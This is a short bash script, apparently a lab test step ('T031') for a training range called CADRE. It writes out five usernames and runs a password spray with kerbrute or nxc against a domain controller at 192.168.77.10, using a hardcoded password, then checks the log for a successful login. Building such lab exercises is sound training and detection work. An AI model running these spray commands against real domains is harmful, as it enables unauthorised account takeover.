#!/usr/bin/env bash
# T031 — Password spray against dc01 (cadre.local) using lab wordlist
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CADRE_ROOT="${CADRE_ROOT:-${HOME}/CADRE}"
WORDLIST="${CADRE_ROOT}/ansible/files/cadre_passwords.txt"
USERS="${USERS_FILE:-/tmp/cadre-spray-users.txt}"
echo "=== T031 password spray ==="
if [[ ! -f "${WORDLIST}" ]]; then
  echo "T031_FAIL: missing ${WORDLIST}" >&2
  exit 1
fi
cat > "${USERS}" <<'EOF'
chief_command
hunter_dfir
analyst_dfir
analyst_cloud
eng_agentic
EOF
SPRAY_LOG="/tmp/${CASE_ID:-cadre-t031}.spray"
if command -v kerbrute >/dev/null 2>&1; then
  set +e
  kerbrute passwordspray -d cadre.local --dc 192.168.77.10 "${USERS}" 'C0mm@nd_Ch1ef!' | tee "${SPRAY_LOG}"
  set -e
  echo "T031_KERBRUTE_DONE"
  grep -qi 'VALID LOGIN' "${SPRAY_LOG}" || { echo "T031_FAIL: kerbrute produced no valid login" >&2; exit 1; }
  echo "T031_OK"
elif command -v nxc >/dev/null 2>&1; then
  set +e
  nxc smb 192.168.77.10 -u "${USERS}" -p 'C0mm@nd_Ch1ef!' --continue-on-success | tee "${SPRAY_LOG}"
  set -e
  echo "T031_NXC_DONE"
  grep -qi 'chief_command' "${SPRAY_LOG}" || { echo "T031_FAIL: nxc produced no successful auth" >&2; exit 1; }
  echo "T031_OK"
else
  echo "T031_FAIL: install kerbrute or nxc on provisioning" >&2
  exit 1
fi
echo "T031 complete"
